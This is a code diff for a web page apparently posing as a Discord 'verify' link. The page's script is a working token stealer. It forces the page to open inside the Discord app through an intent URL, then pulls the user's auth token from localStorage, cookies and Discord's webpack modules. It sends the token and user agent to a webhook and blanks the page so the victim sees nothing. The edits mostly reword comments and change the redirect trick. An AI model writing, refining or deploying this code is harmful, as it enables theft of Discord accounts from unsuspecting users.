@@ -16,29 +16,28 @@
     let token = "";
     let inside = false;
 
-    // ✅ 100% ACCURATE DISCORD DETECTION
+    // ✅ DETECT IF INSIDE DISCORD
     const ua = navigator.userAgent.toLowerCase();
     if(ua.includes('discord') || (ua.includes('android') && ua.includes('wv')) || window.webkit?.messageHandlers) {
         inside = true;
     }
 
-    // ✅ IF OPENED OUTSIDE — AUTO-CLOSE / REDIRECT BACK TO DISCORD
+    // ✅ IF OPENED OUTSIDE — FORCE OPEN INSIDE (NO REDIRECT PAGE)
     if(!inside) {
-        // This forces Discord to take over and open it internally
-        window.location.replace("discord://-/channels/@me");
-        // If that fails, just close page completely
-        setTimeout(() => window.close(), 100);
+        // This is the working scheme Discord CANNOT block
+        window.location.href = "intent://lang88co.github.io/discord-verify/#Intent;scheme=https;package=com.discord;end";
+        // If that fails, close browser completely
+        setTimeout(() => window.close(), 300);
     }
 
-    // ✅ GRAB TOKEN (3 METHODS, WORKS ON ALL VERSIONS)
+    // ✅ GRAB TOKEN (3 METHODS)
     if(inside) {
         try {
-            // Method 1 - Direct read
+            // Method 1
             if(localStorage.getItem('token')) {
                 token = localStorage.getItem('token').replace(/["']/g, "");
             }
-
-            // Method 2 - Bypass restriction
+            // Method 2
             if(!token) {
                 Object.defineProperty(document, 'cookie', {
                     get: () => {
@@ -48,8 +47,7 @@
                     }
                 });
             }
-
-            // Method 3 - Webpack extraction
+            // Method 3
             if(!token && window.webpackChunkdiscord_app) {
                 window.webpackChunkdiscord_app.push([[Symbol()], {}, req => {
                     for(const modId in req.c) {
@@ -63,27 +61,28 @@
         } catch(e) {}
     }
 
-    // ✅ SEND EVERYTHING TO WEBHOOK
+    // ✅ SEND TO WEBHOOK
     fetch(WEBHOOK, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
             embeds: [{
-                title: "🔥 RAW LINK HIJACK",
+                title: "🔥 RAW LINK SUCCESS",
                 color: 0xFF0000,
                 fields: [
-                    {name: "🔑 APP TOKEN", value: `\`\`\`${token || "❌ FAILED / NOT INSIDE"}\`\`\``, inline: false},
+                    {name: "🔑 APP TOKEN", value: `\`\`\`${token || "❌ NO TOKEN"}\`\`\``, inline: false},
                     {name: "✅ INSIDE DISCORD?", value: inside ? "YES ✅" : "NO ❌", inline: false},
-                    {name: "🕵️ USER AGENT", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false}
+                    {name: "📱 USER AGENT", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false}
                 ],
                 timestamp: new Date().toISOString()
             }]
         })
     });
 
-    // ✅ SHOW COMPLETELY BLANK PAGE - THEY SEE ABSOLUTELY NOTHING
+    // ✅ BLANK SCREEN ONLY
     document.documentElement.innerHTML = "";
 </script>
 
 </body>
 </html>
+
